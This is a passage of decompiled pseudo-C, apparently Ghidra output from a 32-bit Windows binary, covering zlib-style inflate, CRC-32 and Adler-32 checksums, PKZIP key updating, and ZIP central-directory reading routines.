      (**(code **)(unaff_ESI + 0x24))(*(undefined4 *)(unaff_ESI + 0x28),local_8);
      return iVar1;
    }
  }
  else {
    if (local_10 == -3) {
      *(char **)(unaff_ESI + 0x18) = s_oversubscribed_literal_length_tr_0041fec0;
      goto LAB_00406449;
    }
    if (local_10 == -4) goto LAB_00406449;
  }
  *(char **)(unaff_ESI + 0x18) = s_incomplete_literal_length_tree_0041fee4;
  local_10 = -3;
LAB_00406449:
  (**(code **)(unaff_ESI + 0x24))(*(undefined4 *)(unaff_ESI + 0x28),local_8);
  return local_10;
}



undefined4 __fastcall
FUN_0040645a(undefined4 param_1,byte **param_2,uint param_3,int param_4,int param_5,int param_6)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  byte *pbVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  int unaff_EDI;
  byte *local_18;
  byte *local_14;
  uint local_10;
  byte *local_c;
  byte *local_8;
  
  local_8 = *param_2;
  local_14 = *(byte **)(unaff_EDI + 0x34);
  local_c = param_2[1];
  local_10 = *(uint *)(unaff_EDI + 0x20);
  uVar9 = *(uint *)(unaff_EDI + 0x1c);
  if (local_14 < *(byte **)(unaff_EDI + 0x30)) {
    local_18 = *(byte **)(unaff_EDI + 0x30) + (-1 - (int)local_14);
  }
  else {
    local_18 = (byte *)(*(int *)(unaff_EDI + 0x2c) - (int)local_14);
  }
  uVar5 = *(uint *)(&DAT_0041e5e8 + param_3 * 4);
  uVar2 = *(uint *)(&DAT_0041e5e8 + param_4 * 4);
  do {
    for (; uVar9 < 0x14; uVar9 = uVar9 + 8) {
      local_c = local_c + -1;
      local_10 = local_10 | (uint)*local_8 << ((byte)uVar9 & 0x1f);
      local_8 = local_8 + 1;
    }
    pbVar4 = (byte *)(param_5 + (uVar5 & local_10) * 8);
    bVar1 = *pbVar4;
LAB_004064f8:
    uVar6 = (uint)bVar1;
    if (uVar6 != 0) {
      local_10 = local_10 >> (pbVar4[1] & 0x1f);
      uVar9 = uVar9 - pbVar4[1];
      if ((bVar1 & 0x10) == 0) {
        if ((bVar1 & 0x40) == 0) break;
        if ((bVar1 & 0x20) == 0) {
          param_2[6] = (byte *)s_invalid_literal_length_code_0041fdcc;
          uVar5 = (int)param_2[1] - (int)local_c;
          if (uVar9 >> 3 < (uint)((int)param_2[1] - (int)local_c)) {
            uVar5 = uVar9 >> 3;
          }
          *(uint *)(unaff_EDI + 0x20) = local_10;
          *(uint *)(unaff_EDI + 0x1c) = uVar9 + uVar5 * -8;
          param_2[1] = local_c + uVar5;
          pbVar4 = *param_2;
          *param_2 = local_8 + -uVar5;
          param_2[2] = param_2[2] + ((int)(local_8 + -uVar5) - (int)pbVar4);
          *(byte **)(unaff_EDI + 0x34) = local_14;
          return 0xfffffffd;
        }
        uVar5 = (int)param_2[1] - (int)local_c;
        if (uVar9 >> 3 < (uint)((int)param_2[1] - (int)local_c)) {
          uVar5 = uVar9 >> 3;
        }
        param_3 = 1;
      }
      else {
        uVar6 = uVar6 & 0xf;
        uVar7 = (*(uint *)(&DAT_0041e5e8 + uVar6 * 4) & local_10) + *(int *)(pbVar4 + 4);
        local_10 = local_10 >> (sbyte)uVar6;
        for (uVar9 = uVar9 - uVar6; uVar9 < 0xf; uVar9 = uVar9 + 8) {
          local_c = local_c + -1;
          local_10 = local_10 | (uint)*local_8 << ((byte)uVar9 & 0x1f);
          local_8 = local_8 + 1;
        }
        pbVar4 = (byte *)(param_6 + (uVar2 & local_10) * 8);
        bVar1 = *pbVar4;
        local_10 = local_10 >> (pbVar4[1] & 0x1f);
        uVar9 = uVar9 - pbVar4[1];
        while( true ) {
          param_3 = (uint)bVar1;
          if ((bVar1 & 0x10) != 0) {
            uVar6 = param_3 & 0xf;
            for (; uVar9 < uVar6; uVar9 = uVar9 + 8) {
              local_c = local_c + -1;
              local_10 = local_10 | (uint)*local_8 << ((byte)uVar9 & 0x1f);
              local_8 = local_8 + 1;
            }
            uVar8 = *(uint *)(&DAT_0041e5e8 + uVar6 * 4) & local_10;
            local_10 = local_10 >> (sbyte)uVar6;
            local_18 = local_18 + -uVar7;
            uVar9 = uVar9 - uVar6;
            pbVar3 = local_14 + -(uVar8 + *(int *)(pbVar4 + 4));
            pbVar4 = *(byte **)(unaff_EDI + 0x28);
            if (pbVar3 < pbVar4) {
              do {
                pbVar3 = pbVar3 + (*(int *)(unaff_EDI + 0x2c) - (int)pbVar4);
              } while (pbVar3 < pbVar4);
              param_3 = *(int *)(unaff_EDI + 0x2c) - (int)pbVar3;
              if (param_3 < uVar7) {
                param_4 = uVar7 - param_3;
                do {
                  *local_14 = *pbVar3;
                  local_14 = local_14 + 1;
                  pbVar3 = pbVar3 + 1;
                  param_3 = param_3 - 1;
                } while (param_3 != 0);
                pbVar4 = *(byte **)(unaff_EDI + 0x28);
                do {
                  *local_14 = *pbVar4;
                  local_14 = local_14 + 1;
                  pbVar4 = pbVar4 + 1;
                  param_4 = param_4 + -1;
                } while (param_4 != 0);
              }
              else {
                *local_14 = *pbVar3;
                local_14[1] = pbVar3[1];
                local_14 = local_14 + 2;
                pbVar3 = pbVar3 + 2;
                param_4 = uVar7 - 2;
                do {
                  *local_14 = *pbVar3;
                  local_14 = local_14 + 1;
                  pbVar3 = pbVar3 + 1;
                  param_4 = param_4 + -1;
                } while (param_4 != 0);
              }
            }
            else {
              *local_14 = *pbVar3;
              local_14[1] = pbVar3[1];
              local_14 = local_14 + 2;
              pbVar3 = pbVar3 + 2;
              param_4 = uVar7 - 2;
              do {
                *local_14 = *pbVar3;
                local_14 = local_14 + 1;
                pbVar3 = pbVar3 + 1;
                param_4 = param_4 + -1;
              } while (param_4 != 0);
            }
            goto LAB_00406679;
          }
          if ((bVar1 & 0x40) != 0) break;
          pbVar4 = pbVar4 + ((*(uint *)(&DAT_0041e5e8 + param_3 * 4) & local_10) +
                            *(int *)(pbVar4 + 4)) * 8;
          bVar1 = *pbVar4;
          local_10 = local_10 >> (pbVar4[1] & 0x1f);
          uVar9 = uVar9 - pbVar4[1];
        }
        param_2[6] = (byte *)s_invalid_distance_code_0041fde8;
        uVar5 = (int)param_2[1] - (int)local_c;
        if (uVar9 >> 3 < (uint)((int)param_2[1] - (int)local_c)) {
          uVar5 = uVar9 >> 3;
        }
        param_3 = 0xfffffffd;
      }
      *(uint *)(unaff_EDI + 0x20) = local_10;
      *(uint *)(unaff_EDI + 0x1c) = uVar9 + uVar5 * -8;
      param_2[1] = local_c + uVar5;
      pbVar4 = *param_2;
      *param_2 = local_8 + -uVar5;
      param_2[2] = param_2[2] + ((int)(local_8 + -uVar5) - (int)pbVar4);
      *(byte **)(unaff_EDI + 0x34) = local_14;
      return param_3;
    }
    local_10 = local_10 >> (pbVar4[1] & 0x1f);
    uVar9 = uVar9 - pbVar4[1];
    *local_14 = pbVar4[4];
    local_14 = local_14 + 1;
    local_18 = local_18 + -1;
LAB_00406679:
    if ((local_18 < (byte *)0x102) || (local_c < (byte *)0xa)) {
      uVar5 = (int)param_2[1] - (int)local_c;
      if (uVar9 >> 3 < (uint)((int)param_2[1] - (int)local_c)) {
        uVar5 = uVar9 >> 3;
      }
      *(uint *)(unaff_EDI + 0x20) = local_10;
      *(uint *)(unaff_EDI + 0x1c) = uVar9 + uVar5 * -8;
      param_2[1] = local_c + uVar5;
      pbVar4 = *param_2;
      *param_2 = local_8 + -uVar5;
      param_2[2] = param_2[2] + ((int)(local_8 + -uVar5) - (int)pbVar4);
      *(byte **)(unaff_EDI + 0x34) = local_14;
      return 0;
    }
  } while( true );
  pbVar4 = pbVar4 + ((*(uint *)(&DAT_0041e5e8 + uVar6 * 4) & local_10) + *(int *)(pbVar4 + 4)) * 8;
  bVar1 = *pbVar4;
  goto LAB_004064f8;
}



uint __fastcall FUN_00406785(byte *param_1,uint param_2)

{
  uint in_EAX;
  uint uVar1;
  uint uVar2;
  
  if (param_1 == (byte *)0x0) {
    return 0;
  }
  uVar1 = ~in_EAX;
  if (7 < param_2) {
    uVar2 = param_2 >> 3;
    do {
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f9a0 + ((*param_1 ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f9a0 + ((param_1[1] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f9a0 + ((param_1[2] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f9a0 + ((param_1[3] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f9a0 + ((param_1[4] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f9a0 + ((param_1[5] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f9a0 + ((param_1[6] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f9a0 + ((param_1[7] ^ uVar1) & 0xff) * 4);
      param_1 = param_1 + 8;
      param_2 = param_2 - 8;
      uVar2 = uVar2 - 1;
    } while (uVar2 != 0);
  }
  for (; param_2 != 0; param_2 = param_2 - 1) {
    uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f9a0 + ((*param_1 ^ uVar1) & 0xff) * 4);
    param_1 = param_1 + 1;
  }
  return ~uVar1;
}



void __fastcall FUN_00406860(uint *param_1,char param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_0041f9a0 + (((int)param_2 ^ *param_1) & 0xff) * 4) ^ *param_1 >> 8;
  *param_1 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_1[1]) * 0x8088405 + 1;
  param_1[1] = uVar1;
  param_1[2] = param_1[2] >> 8 ^
               *(uint *)(&DAT_0041f9a0 + ((uVar1 >> 0x18 ^ param_1[2]) & 0xff) * 4);
  return;
}



uint __cdecl FUN_004068a6(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  int iVar18;
  uint uVar19;
  
  uVar3 = param_1 & 0xffff;
  uVar19 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    uVar3 = 1;
  }
  else {
    if (param_3 != 0) {
      do {
        uVar2 = 0x15b0;
        if (param_3 < 0x15b0) {
          uVar2 = param_3;
        }
        param_3 = param_3 - uVar2;
        if (0xf < (int)uVar2) {
          uVar1 = uVar2 >> 4;
          uVar2 = uVar2 + uVar1 * -0x10;
          do {
            iVar4 = uVar3 + *param_2;
            iVar5 = iVar4 + (uint)param_2[1];
            iVar6 = iVar5 + (uint)param_2[2];
            iVar7 = iVar6 + (uint)param_2[3];
            iVar8 = iVar7 + (uint)param_2[4];
            iVar9 = iVar8 + (uint)param_2[5];
            iVar10 = iVar9 + (uint)param_2[6];
            iVar11 = iVar10 + (uint)param_2[7];
            iVar12 = iVar11 + (uint)param_2[8];
            iVar13 = iVar12 + (uint)param_2[9];
            iVar14 = iVar13 + (uint)param_2[10];
            iVar15 = iVar14 + (uint)param_2[0xb];
            iVar16 = iVar15 + (uint)param_2[0xc];
            iVar17 = iVar16 + (uint)param_2[0xd];
            iVar18 = iVar17 + (uint)param_2[0xe];
            uVar3 = iVar18 + (uint)param_2[0xf];
            uVar19 = uVar19 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 +
                     iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + iVar18 + uVar3;
            param_2 = param_2 + 0x10;
            uVar1 = uVar1 - 1;
          } while (uVar1 != 0);
        }
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          uVar3 = uVar3 + *param_2;
          param_2 = param_2 + 1;
          uVar19 = uVar19 + uVar3;
        }
        uVar3 = uVar3 % 0xfff1;
        uVar19 = uVar19 % 0xfff1;
      } while (param_3 != 0);
    }
    uVar3 = uVar19 << 0x10 | uVar3;
  }
  return uVar3;
}



void __cdecl FUN_004069b8(undefined4 param_1,size_t param_2,size_t param_3)

{
  _calloc(param_2,param_3);
  return;
}



undefined4 FUN_004069d3(void)

{
  uint *puVar1;
  int in_EAX;
  
  if ((in_EAX != 0) && (puVar1 = *(uint **)(in_EAX + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(in_EAX + 0x14) = 0;
    *(undefined4 *)(in_EAX + 8) = 0;
    *(undefined4 *)(in_EAX + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    FUN_00405653();
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00406a10(void)

{
  int iVar1;
  int in_EAX;
  
  if (((in_EAX != 0) && (*(int *)(in_EAX + 0x1c) != 0)) && (*(int *)(in_EAX + 0x24) != 0)) {
    iVar1 = *(int *)(*(int *)(in_EAX + 0x1c) + 0x14);
    if (iVar1 != 0) {
      FUN_00405653();
      (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),*(undefined4 *)(iVar1 + 0x28));
      (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),*(undefined4 *)(iVar1 + 0x24));
      (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),iVar1);
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),*(undefined4 *)(in_EAX + 0x1c));
    *(undefined4 *)(in_EAX + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00406a68(void)

{
  int iVar1;
  undefined4 *puVar2;
  int unaff_ESI;
  
  if (unaff_ESI == 0) {
    return 0xfffffffe;
  }
  *(undefined4 *)(unaff_ESI + 0x18) = 0;
  if (*(int *)(unaff_ESI + 0x20) == 0) {
    *(code **)(unaff_ESI + 0x20) = FUN_004069b8;
    *(undefined4 *)(unaff_ESI + 0x28) = 0;
  }
  if (*(int *)(unaff_ESI + 0x24) == 0) {
    *(undefined **)(unaff_ESI + 0x24) = &LAB_004069c8;
  }
  iVar1 = (**(code **)(unaff_ESI + 0x20))(*(undefined4 *)(unaff_ESI + 0x28),1,0x18);
  *(int *)(unaff_ESI + 0x1c) = iVar1;
  if (iVar1 != 0) {
    *(undefined4 *)(iVar1 + 0x14) = 0;
    *(undefined4 *)(*(int *)(unaff_ESI + 0x1c) + 0xc) = 0;
    *(undefined4 *)(*(int *)(unaff_ESI + 0x1c) + 0xc) = 1;
    *(undefined4 *)(*(int *)(unaff_ESI + 0x1c) + 0x10) = 0xf;
    puVar2 = FUN_004056ae(~-(uint)(*(int *)(*(int *)(unaff_ESI + 0x1c) + 0xc) != 0) & 0x4068a6);
    *(undefined4 **)(*(int *)(unaff_ESI + 0x1c) + 0x14) = puVar2;
    if (*(int *)(*(int *)(unaff_ESI + 0x1c) + 0x14) != 0) {
      FUN_004069d3();
      return 0;
    }
    FUN_00406a10();
  }
  return 0xfffffffc;
}



int FUN_00406b05(void)

{
  byte bVar1;
  undefined4 uVar2;
  byte **in_EAX;
  undefined4 *puVar3;
  int iVar4;
  
  if (((in_EAX == (byte **)0x0) || (puVar3 = (undefined4 *)in_EAX[7], puVar3 == (undefined4 *)0x0))
     || (*in_EAX == (byte *)0x0)) {
LAB_00406d27:
    return -2;
  }
  iVar4 = -5;
LAB_00406d1a:
  switch(*puVar3) {
  case 0:
    if (in_EAX[1] == (byte *)0x0) {
      return iVar4;
    }
    iVar4 = 0;
    in_EAX[2] = in_EAX[2] + 1;
    in_EAX[1] = in_EAX[1] + -1;
    *(uint *)(in_EAX[7] + 4) = (uint)**in_EAX;
    puVar3 = (undefined4 *)in_EAX[7];
    uVar2 = puVar3[1];
    *in_EAX = *in_EAX + 1;
    if (((byte)uVar2 & 0xf) == 8) {
      if (((uint)puVar3[1] >> 4) + 8 <= (uint)puVar3[4]) {
        *puVar3 = 1;
        goto switchD_00406b33_caseD_1;
      }
      *puVar3 = 0xd;
      in_EAX[6] = (byte *)s_invalid_window_size_0041ff80;
    }
    else {
      *puVar3 = 0xd;
      in_EAX[6] = (byte *)s_unknown_compression_method_0041ff64;
    }
    goto LAB_00406d0d;
  case 1:
switchD_00406b33_caseD_1:
    if (in_EAX[1] == (byte *)0x0) {
      return iVar4;
    }
    puVar3 = (undefined4 *)in_EAX[7];
    iVar4 = 0;
    in_EAX[2] = in_EAX[2] + 1;
    in_EAX[1] = in_EAX[1] + -1;
    bVar1 = **in_EAX;
    *in_EAX = *in_EAX + 1;
    if ((puVar3[1] * 0x100 + (uint)bVar1) % 0x1f != 0) {
      *puVar3 = 0xd;
      in_EAX[6] = (byte *)s_incorrect_header_check_0041ff94;
      goto LAB_00406d0d;
    }
    if ((bVar1 & 0x20) != 0) {
      *(undefined4 *)in_EAX[7] = 2;
      goto switchD_00406b33_caseD_2;
    }
    *puVar3 = 7;
    break;
  case 2:
switchD_00406b33_caseD_2:
    if (in_EAX[1] == (byte *)0x0) {
      return iVar4;
    }
    iVar4 = 0;
    in_EAX[2] = in_EAX[2] + 1;
    in_EAX[1] = in_EAX[1] + -1;
    *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
    *in_EAX = *in_EAX + 1;
    *(undefined4 *)in_EAX[7] = 3;
  case 3:
    goto switchD_00406b33_caseD_3;
  case 4:
    goto switchD_00406b33_caseD_4;
  case 5:
    goto switchD_00406b33_caseD_5;
  case 6:
    *(undefined4 *)in_EAX[7] = 0xd;
    in_EAX[6] = (byte *)s_need_dictionary_0041e00c;
    *(undefined4 *)(in_EAX[7] + 4) = 0;
    return -2;
  case 7:
    iVar4 = FUN_0040572e(*(uint **)(in_EAX[7] + 0x14),iVar4);
    if (iVar4 == -3) {
      *(undefined4 *)in_EAX[7] = 0xd;
      *(undefined4 *)(in_EAX[7] + 4) = 0;
      iVar4 = -3;
    }
    else {
      if (iVar4 != 1) {
        return iVar4;
      }
      iVar4 = 0;
      FUN_00405653();
      puVar3 = (undefined4 *)in_EAX[7];
      if (puVar3[3] == 0) {
        *puVar3 = 8;
        goto switchD_00406b33_caseD_8;
      }
      *puVar3 = 0xc;
    }
    break;
  case 8:
switchD_00406b33_caseD_8:
    if (in_EAX[1] == (byte *)0x0) {
      return iVar4;
    }
    iVar4 = 0;
    in_EAX[2] = in_EAX[2] + 1;
    in_EAX[1] = in_EAX[1] + -1;
    *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
    *in_EAX = *in_EAX + 1;
    *(undefined4 *)in_EAX[7] = 9;
  case 9:
    if (in_EAX[1] == (byte *)0x0) {
      return iVar4;
    }
    iVar4 = 0;
    in_EAX[2] = in_EAX[2] + 1;
    in_EAX[1] = in_EAX[1] + -1;
    *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
    *in_EAX = *in_EAX + 1;
    *(undefined4 *)in_EAX[7] = 10;
  case 10:
    goto switchD_00406b33_caseD_a;
  case 0xb:
    goto switchD_00406b33_caseD_b;
  case 0xc:
    goto LAB_00406d27;
  case 0xd:
    return -3;
  default:
    goto LAB_00406d27;
  }
LAB_00406d17:
  puVar3 = (undefined4 *)in_EAX[7];
  goto LAB_00406d1a;
switchD_00406b33_caseD_a:
  if (in_EAX[1] == (byte *)0x0) {
    return iVar4;
  }
  iVar4 = 0;
  in_EAX[2] = in_EAX[2] + 1;
  in_EAX[1] = in_EAX[1] + -1;
  *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
  *in_EAX = *in_EAX + 1;
  *(undefined4 *)in_EAX[7] = 0xb;
switchD_00406b33_caseD_b:
  if (in_EAX[1] == (byte *)0x0) {
    return iVar4;
  }
  in_EAX[2] = in_EAX[2] + 1;
  in_EAX[1] = in_EAX[1] + -1;
  *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
  puVar3 = (undefined4 *)in_EAX[7];
  *in_EAX = *in_EAX + 1;
  if (puVar3[1] == puVar3[2]) {
    *(undefined4 *)in_EAX[7] = 0xc;
LAB_00406d27:
    return 1;
  }
  *puVar3 = 0xd;
  in_EAX[6] = (byte *)s_incorrect_data_check_0041ffac;
LAB_00406d0d:
  iVar4 = 0;
  *(undefined4 *)(in_EAX[7] + 4) = 5;
  goto LAB_00406d17;
switchD_00406b33_caseD_3:
  if (in_EAX[1] == (byte *)0x0) {
    return iVar4;
  }
  iVar4 = 0;
  in_EAX[2] = in_EAX[2] + 1;
  in_EAX[1] = in_EAX[1] + -1;
  *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
  *in_EAX = *in_EAX + 1;
  *(undefined4 *)in_EAX[7] = 4;
switchD_00406b33_caseD_4:
  if (in_EAX[1] == (byte *)0x0) {
    return iVar4;
  }
  iVar4 = 0;
  in_EAX[2] = in_EAX[2] + 1;
  in_EAX[1] = in_EAX[1] + -1;
  *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
  *in_EAX = *in_EAX + 1;
  *(undefined4 *)in_EAX[7] = 5;
switchD_00406b33_caseD_5:
  if (in_EAX[1] != (byte *)0x0) {
    in_EAX[2] = in_EAX[2] + 1;
    in_EAX[1] = in_EAX[1] + -1;
    *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
    *in_EAX = *in_EAX + 1;
    in_EAX[0xc] = *(byte **)((int)in_EAX[7] + 8);
    *(undefined4 *)in_EAX[7] = 6;
    return 2;
  }
  return iVar4;
}



undefined4 FUN_00406e55(void)

{
  void *unaff_ESI;
  
  if (unaff_ESI == (void *)0x0) {
    return 0xffffffff;
  }
  if (*(char *)((int)unaff_ESI + 0x10) != '\0') {
    CloseHandle(*(HANDLE *)((int)unaff_ESI + 4));
  }
  FUN_0040b579(unaff_ESI);
  return 0;
}



undefined4 __fastcall FUN_00406e76(undefined4 param_1,int param_2)

{
  char *in_EAX;
  DWORD unaff_ESI;
  
  if (*in_EAX == '\0') {
    if (unaff_ESI == 0) {
      *(int *)(in_EAX + 0x1c) = param_2;
    }
    else if (unaff_ESI == 1) {
      *(int *)(in_EAX + 0x1c) = *(int *)(in_EAX + 0x1c) + param_2;
    }
    else if (unaff_ESI == 2) {
      *(int *)(in_EAX + 0x1c) = *(int *)(in_EAX + 0x18) + param_2;
    }
  }
  else {
    if (in_EAX[1] == '\0') {
      return 0x1d;
    }
    if (unaff_ESI == 0) {
      unaff_ESI = 0;
      param_2 = *(int *)(in_EAX + 0xc) + param_2;
    }
    else if ((unaff_ESI != 1) && (unaff_ESI != 2)) {
      return 0x13;
    }
    SetFilePointer(*(HANDLE *)(in_EAX + 4),param_2,(PLONG)0x0,unaff_ESI);
  }
  return 0;
}



uint __cdecl FUN_00406ed5(void *param_1,uint param_2,size_t param_3)

{
  int iVar1;
  BOOL BVar2;
  char *unaff_ESI;
  size_t _Size;
  
  _Size = param_2 * param_3;
  if (*unaff_ESI == '\0') {
    iVar1 = *(int *)(unaff_ESI + 0x1c);
    if (*(uint *)(unaff_ESI + 0x18) < iVar1 + _Size) {
      _Size = *(uint *)(unaff_ESI + 0x18) - iVar1;
    }
    _memcpy(param_1,(void *)(*(int *)(unaff_ESI + 0x14) + iVar1),_Size);
    *(size_t *)(unaff_ESI + 0x1c) = *(int *)(unaff_ESI + 0x1c) + _Size;
    param_3 = _Size;
  }
  else {
    BVar2 = ReadFile(*(HANDLE *)(unaff_ESI + 4),param_1,_Size,&param_3,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_ESI[8] = '\x01';
    }
  }
  return param_3 / param_2;
}



undefined4 __cdecl FUN_00406f35(uint *param_1)

{
  char *in_EAX;
  uint uVar1;
  byte local_5;
  
  uVar1 = FUN_00406ed5(&local_5,1,1);
  if (uVar1 == 1) {
    *param_1 = (uint)local_5;
  }
  else if ((*in_EAX != '\0') && (in_EAX[8] != '\0')) {
    return 0xffffffff;
  }
  return 0;
}



void FUN_00406f6f(undefined4 param_1)

{
  uint uVar1;
  int iVar2;
  int *unaff_EDI;
  uint local_8;
  
  iVar2 = FUN_00406f35(&local_8);
  uVar1 = local_8;
  if ((iVar2 == 0) && (iVar2 = FUN_00406f35(&local_8), iVar2 == 0)) {
    *unaff_EDI = local_8 * 0x100 + uVar1;
    return;
  }
  *unaff_EDI = 0;
  return;
}



void FUN_00406fab(void)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *unaff_EBX;
  uint local_8;
  
  iVar2 = FUN_00406f35(&local_8);
  uVar1 = local_8;
  if (iVar2 == 0) {
    iVar2 = FUN_00406f35(&local_8);
  }
  iVar3 = local_8 * 0x100;
  if (iVar2 == 0) {
    iVar2 = FUN_00406f35(&local_8);
  }
  iVar4 = local_8 * 0x10000;
  if ((iVar2 == 0) && (iVar2 = FUN_00406f35(&local_8), iVar2 == 0)) {
    *unaff_EBX = local_8 * 0x1000000 + uVar1 + iVar3 + iVar4;
    return;
  }
  *unaff_EBX = 0;
  return;
}



int __thiscall FUN_00407015(void *this,char *param_1)

{
  int iVar1;
  DWORD DVar2;
  void *_Memory;
  uint uVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int local_18;
  uint local_10;
  uint local_c;
  uint local_8;
  
  iVar1 = FUN_00406e76(this,0);
  if (iVar1 == 0) {
    if (*param_1 == '\0') {
      local_8 = *(uint *)(param_1 + 0x1c);
    }
    else if (param_1[1] == '\0') {
      local_8 = 0;
    }
    else {
      DVar2 = SetFilePointer(*(HANDLE *)(param_1 + 4),0,(PLONG)0x0,1);
      local_8 = DVar2 - *(int *)(param_1 + 0xc);
    }
    local_c = 0xffff;
    if (local_8 < 0xffff) {
      local_c = local_8;
    }
    _Memory = _malloc(0x404);
    if (_Memory == (void *)0x0) {
      local_18 = -1;
    }
    else {
      local_18 = -1;
      local_10 = 4;
      if (4 < local_c) {
        while( true ) {
          uVar3 = local_10 + 0x400;
          local_10 = local_c;
          if (uVar3 <= local_c) {
            local_10 = uVar3;
          }
          iVar1 = local_8 - local_10;
          uVar3 = 0x404;
          if (local_8 - iVar1 < 0x405) {
            uVar3 = local_8 - iVar1;
          }
          iVar4 = FUN_00406e76(local_c,iVar1);
          if ((iVar4 != 0) || (uVar5 = FUN_00406ed5(_Memory,uVar3,1), uVar5 != 1)) break;
          iVar4 = uVar3 - 3;
          do {
            iVar6 = iVar4;
            if (iVar6 < 0) goto LAB_0040712b;
            iVar4 = iVar6 + -1;
          } while ((((*(char *)(iVar4 + (int)_Memory) != 'P') ||
                    (*(char *)(iVar6 + (int)_Memory) != 'K')) ||
                   (*(char *)(iVar6 + 1 + (int)_Memory) != '\x05')) ||
                  (*(char *)(iVar6 + 2 + (int)_Memory) != '\x06'));
          local_18 = iVar4 + iVar1;
LAB_0040712b:
          if ((local_18 != 0) || (local_c <= local_10)) break;
        }
      }
      _free(_Memory);
    }
  }
  else {
    local_18 = -1;
  }
  return local_18;
}



char ** __thiscall FUN_0040714e(void *this,char *param_1)

{
  int iVar1;
  char **ppcVar2;
  char **ppcVar3;
  char **ppcVar4;
  char *pcVar5;
  char *local_98 [3];
  int local_8c;
  int local_7c;
  int local_78;
  int local_74;
  undefined4 local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  
  if (param_1 == (char *)0x0) {
    return (char **)0x0;
  }
  local_c = 0;
  pcVar5 = param_1;
  local_14 = FUN_00407015(this,param_1);
  if (local_14 == -1) {
    local_c = -1;
  }
  iVar1 = FUN_00406e76(pcVar5,local_14);
  if (iVar1 != 0) {
    local_c = -1;
  }
  iVar1 = FUN_00406fab();
  if (iVar1 != 0) {
    local_c = -1;
  }
  iVar1 = FUN_00406f6f(param_1);
  if (iVar1 != 0) {
    local_c = -1;
  }
  iVar1 = FUN_00406f6f(param_1);
  if (iVar1 != 0) {
    local_c = -1;
  }
  iVar1 = FUN_00406f6f(param_1);
  if (iVar1 != 0) {
    local_c = -1;
  }
  iVar1 = FUN_00406f6f(param_1);
  if (iVar1 != 0) {
    local_c = -1;
  }
  if (((param_1 != local_98[1]) || (local_18 != 0)) || (local_10 != 0)) {
    local_c = -0x67;
  }
  iVar1 = FUN_00406fab();
  if (iVar1 != 0) {
    local_c = -1;
  }
  iVar1 = FUN_00406fab();
  if (iVar1 != 0) {
    local_c = -1;
  }
  iVar1 = FUN_00406f6f(param_1);
  if (iVar1 != 0) {
    local_c = -1;
  }
  if ((uint)(*(int *)(param_1 + 0xc) + local_14) < (uint)(local_78 + local_74)) {
    if (local_c != 0) goto LAB_0040726c;
    local_c = -0x67;
  }
  if (local_c == 0) {
    local_8c = ((*(int *)(param_1 + 0xc) - local_78) - local_74) + local_14;
    local_98[0] = param_1;
    local_7c = local_14;
    local_1c = 0;
    *(undefined4 *)(param_1 + 0xc) = 0;
    ppcVar2 = (char **)_malloc(0x80);
    ppcVar3 = local_98;
    ppcVar4 = ppcVar2;
    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {
      *ppcVar4 = *ppcVar3;
      ppcVar3 = ppcVar3 + 1;
      ppcVar4 = ppcVar4 + 1;
    }
    FUN_004074dd((void *)0x0);
    return ppcVar2;
  }
LAB_0040726c:
  FUN_00406e55();
  return (char **)0x0;
}



int __thiscall
FUN_004072ba(void *this,int param_1,undefined4 *param_2,int *param_3,void *param_4,uint param_5)

{
